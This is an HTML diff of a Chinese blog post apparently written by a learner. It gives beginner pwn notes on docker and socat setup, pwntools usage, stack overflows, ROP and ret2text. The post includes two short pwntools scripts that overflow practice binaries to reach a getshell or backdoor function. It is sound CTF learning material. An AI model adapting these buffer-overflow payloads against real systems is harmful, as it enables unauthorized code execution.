@@ -1,418 +1,249 @@
+
+
 <!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="刻苦学习逆向的小菜鸡。">
+  <meta name="author" content="丨S1lenc3丨">
+  <meta name="keywords" content="">
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <title>pwn入门学习 - S1lenc3的辣鸡场</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
 
-
-
-  
-  
-  
-  
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
   
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
   
 
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 
-  <meta name="keywords" content="writeup,pwn," />
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
 
 
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
-
-
-
-
-
-
-<meta name="description" content="前言pwn，它还是来了，从CTF学起，https:&#x2F;&#x2F;yangtf.gitee.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;stackoverflow&#x2F;basic_rop&#x2F; 环境配置安装docker。 导入镜像：cat ubuntu.17.04.amd64.tar | docker import - ubuntu&#x2F;17.04.amd64 docker命令： 12345678910111213&#x2F;&#x2F;导入镜像：do">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwn入门学习">
-<meta property="og:url" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/index.html">
-<meta property="og:site_name" content="S1lenc3的辣鸡场">
-<meta property="og:description" content="前言pwn，它还是来了，从CTF学起，https:&#x2F;&#x2F;yangtf.gitee.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;stackoverflow&#x2F;basic_rop&#x2F; 环境配置安装docker。 导入镜像：cat ubuntu.17.04.amd64.tar | docker import - ubuntu&#x2F;17.04.amd64 docker命令： 12345678910111213&#x2F;&#x2F;导入镜像：do">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213800491.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213743741.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213949843.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214305481.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214401818.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521215802315.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221119660.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221251779.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182503328-7467905.png">
-<meta property="og:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182541456.png">
-<meta property="article:published_time" content="2021-05-30T12:56:03.000Z">
-<meta property="article:modified_time" content="2021-07-28T11:30:48.736Z">
-<meta property="article:author" content="丨S1lenc3丨">
-<meta property="article:tag" content="writeup,pwn">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213800491.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '',
-    scheme: 'Muse',
-    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="https://www.S1lenc3.com/2021/05/30/pwn入门学习/"/>
-
-
-
-
-
-  <title>pwn入门学习 | S1lenc3的辣鸡场</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.s1lenc3.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="S1lenc3的辣鸡场" type="application/atom+xml">
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>S1lenc3</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-right page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">S1lenc3的辣鸡场</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            Archives
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            Tags
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.S1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/kenan.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="S1lenc3的辣鸡场">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">pwn入门学习</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-30T20:56:03+08:00">
-                2021-05-30
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2021-07-28T19:30:48+08:00">
-                2021-07-28
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E8%B5%9B%E9%A2%98writeup/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF赛题writeup</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E8%B5%9B%E9%A2%98writeup/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="pwn入门学习">
               
             </span>
-          
 
-          
             
-          
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-30 20:56" pubdate>
+        2021年5月30日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      669 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      8
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
 
           
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-file-o"></i>
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pwn，它还是来了，从CTF学起，<a target="_blank" rel="noopener" href="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/">https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/</a></p>
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pwn入门学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年7月28日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pwn，它还是来了，从CTF学起，<a target="_blank" rel="noopener" href="https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/">https://yangtf.gitee.io/ctf-wiki/pwn/stackoverflow/basic_rop/</a></p>
 <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>安装docker。</p>
 <p>导入镜像：<code>cat ubuntu.17.04.amd64.tar | docker import - ubuntu/17.04.amd64</code></p>
 <p>docker命令：</p>
@@ -422,413 +253,213 @@
 <p>在容器中映射程序端口：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> tcp-listen:<span class="number">10001</span>,reuseaddr,fork EXEC:./heapTest_x<span class="number">86</span>,pty,raw,echo=<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213800491.png" alt="image-20210521213800491"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213800491.png" srcset="/img/loading.gif" lazyload alt="image-20210521213800491"></p>
 <p>开启pwntools：</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213743741.png" alt="image-20210521213743741"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213743741.png" srcset="/img/loading.gif" lazyload alt="image-20210521213743741"></p>
 <p>使用IDA附加程序，</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213949843.png" alt="image-20210521213949843"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521213949843.png" srcset="/img/loading.gif" lazyload alt="image-20210521213949843"></p>
 <p>在python中输入io.recv()可以接收程序的输出。</p>
 <p>使用io.send()可以发送数据给程序，发送数据后需要再发送<code>\n</code>执行回车。或者直接使用sendline()。</p>
 <p>程序成功断下来。</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214305481.png" alt="image-20210521214305481"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214305481.png" srcset="/img/loading.gif" lazyload alt="image-20210521214305481"></p>
 <p>结束时，要使用io.close()关闭io。</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214401818.png" alt="image-20210521214401818"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521214401818.png" srcset="/img/loading.gif" lazyload alt="image-20210521214401818"></p>
 <h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><p>call hello等价于<code>push eip; mov eip, [hello]</code></p>
 <p>leave指令相当于<code>add esp, xxh; mov esp, ebp; pop ebp</code></p>
 <p>栈溢出就是输入超长度的字符串使分配的栈帧溢出以达到控制eip执行的目的。</p>
 <p>下断点：</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521215802315.png" alt="image-20210521215802315"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521215802315.png" srcset="/img/loading.gif" lazyload alt="image-20210521215802315"></p>
 <p>调试并分析代码，可以这样得出偏移：</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221119660.png" alt="image-20210521221119660"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221119660.png" srcset="/img/loading.gif" lazyload alt="image-20210521221119660"></p>
 <p>r处是返回地址，也就是我们要覆盖r，所以需要输入22字节以上才可以覆盖r。</p>
 <p>在容器中映射端口运行程序：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> tcp-listen:<span class="number">10001</span>,reuseaddr,fork EXEC:./hello,pty,raw,echo=<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
 <p>找到getshell函数的地址，用pwntools写脚本：</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221251779.png" alt="image-20210521221251779"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210521221251779.png" srcset="/img/loading.gif" lazyload alt="image-20210521221251779"></p>
 <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;172.17.0.3&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span>*<span class="number">22</span> + p32(<span class="number">0x0804846b</span>)</span><br><span class="line"><span class="built_in">io</span>.send(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="ROP技术"><a href="#ROP技术" class="headerlink" title="ROP技术"></a>ROP技术</h2><p>程序0保护，往往是很容易攻破的，NX保护即栈不可执行，此时就需要使用ROP(Return Oriented Programming)技术绕过保护。主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182503328-7467905.png" alt="image-20210728182503328"></p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182503328-7467905.png" srcset="/img/loading.gif" lazyload alt="image-20210728182503328"></p>
 <p>只开启了NX，IDA看看为代码：</p>
-<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182541456.png" alt="image-20210728182541456"></p>
+<p><img src="/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210728182541456.png" srcset="/img/loading.gif" lazyload alt="image-20210728182541456"></p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找到了后门函数</span><br><span class="line">gdb启动，溢出点确认。</span><br><span class="line">cyclic <span class="number">100</span></span><br><span class="line">cyclic -l xxxx得出栈溢出偏移是<span class="number">112</span></span><br><span class="line">写出<span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x804863a</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-      <div>
-        <ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>Post author:</strong>
-    丨S1lenc3丨
-  </li>
-  <li class="post-copyright-link">
-    <strong>Post link:</strong>
-    <a href="https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/" title="pwn入门学习">https://www.s1lenc3.com/2021/05/30/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>Copyright Notice: </strong>
-    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
-  </li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup-pwn/" rel="tag"># writeup,pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2021/05/30/CISCN-2021-wp/" rel="next" title="CISCN-2021-wp">
-                <i class="fa fa-chevron-left"></i> CISCN-2021-wp
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/" rel="prev" title="ISCC2021娱乐">
-                ISCC2021娱乐 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/images/kenan.jpeg"
-               alt="" />
-          <p class="site-author-name" itemprop="name"></p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">29</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
             </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">14</span>
-                <span class="site-state-item-name">categories</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">11</span>
-                <span class="site-state-item-name">tags</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/S1lenc3-chenmo/" target="_blank" title="GitHub">
-                  
-                    <i class="fa fa-fw fa-github"></i>
-                  
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
                     
-                      GitHub
+                      <a class="hover-with-bg" href="/categories/CTF%E8%B5%9B%E9%A2%98writeup/">CTF赛题writeup</a>
                     
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
+                      <a class="hover-with-bg" href="/categories/CTF%E8%B5%9B%E9%A2%98writeup/pwn/">pwn</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/writeup-pwn/">writeup,pwn</a>
+                    
+                  </div>
+                
+              </div>
               
-            
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
